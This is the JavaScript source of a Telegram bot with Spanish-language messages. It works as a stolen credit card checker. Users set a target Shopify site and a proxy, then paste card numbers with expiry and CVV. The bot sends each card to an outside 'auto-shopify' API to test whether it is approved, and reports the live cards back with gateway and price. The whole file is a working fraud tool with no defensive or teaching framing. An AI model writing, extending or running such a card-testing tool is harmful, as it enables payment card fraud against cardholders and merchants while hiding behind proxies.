require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = Number(process.env.OWNER_ID);

if (!BOT_TOKEN) {
  console.error('BOT_TOKEN no definido');
  process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

/* ================== DATA ================== */
const DATA_FILE = './data.json';
let data = fs.existsSync(DATA_FILE)
  ? JSON.parse(fs.readFileSync(DATA_FILE))
  : { activeSite: null, activeProxy: null };

function saveData() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

const running = {};

/* ================== API ================== */
async function callChkAPI({ site, cc, proxy }) {
  try {
    const res = await axios.get(
      'https://auto-shopify-api-production.up.railway.app/index.php',
      { params: { site, cc, proxy }, timeout: 30000 }
    );

    const d = res.data || {};
    const response = String(d.Response || '').toUpperCase();

    return {
      approved: response.includes('APPRO'),
      response,
      gateway: d.Gateway || 'N/A',
      price: d.Price || 'N/A'
    };
  } catch {
    return { approved: false, response: 'API_ERROR' };
  }
}

/* ================== START ================== */
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
`🤖 Bot activo

Configura:
• /setsite https://site.com
• /setproxy ip:port:user:pass

Luego:
• /chk cc|mm|yy|cvv
• /stop`
  );
});

/* ================== CONFIG ================== */
bot.onText(/\/setsite (.+)/, (msg, match) => {
  data.activeSite = match[1].trim();
  saveData();
  bot.sendMessage(msg.chat.id, `🌐 Site activo:\n${data.activeSite}`);
});

bot.onText(/\/setproxy (.+)/, (msg, match) => {
  data.activeProxy = match[1].trim();
  saveData();
  bot.sendMessage(msg.chat.id, `🧰 Proxy activo:\n${data.activeProxy}`);
});

/* ================== CHK ================== */
bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!data.activeSite || !data.activeProxy) {
    return bot.sendMessage(chatId, '❌ Configura site y proxy primero');
  }

  const input = match[1].trim();
  if (!input) {
    return bot.sendMessage(chatId, '❌ Envía tarjetas después del comando');
  }

  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);
  running[chatId] = true;

  let approved = 0;
  let declined = 0;

  const progressMsg = await bot.sendMessage(chatId, `⏳ 0/${ccs.length}`);

  for (let i = 0; i < ccs.length; i++) {
    if (!running[chatId]) break;

    const cc = ccs[i];
    const r = await callChkAPI({
      site: data.activeSite,
      cc,
      proxy: data.activeProxy
    });

    if (r.approved) {
      approved++;
      await bot.sendMessage(chatId,
`━━━━━━━━━━━━━━
💳 ${cc}
🏪 ${r.gateway}
💰 ${r.price}
✅ ${r.response}`);
    } else {
      declined++;
    }

    await bot.editMessageText(
      `⏳ ${i + 1}/${ccs.length}\n✅ ${approved} ❌ ${declined}`,
      { chat_id: chatId, message_id: progressMsg.message_id }
    );
  }

  running[chatId] = false;

  bot.sendMessage(chatId,
`✅ Finalizado
Aprobadas: ${approved}
Rechazadas: ${declined}`);
});

/* ================== STOP ================== */
bot.onText(/\/stop/, (msg) => {
  running[msg.chat.id] = false;
  bot.sendMessage(msg.chat.id, '⛔ Proceso detenido');
});
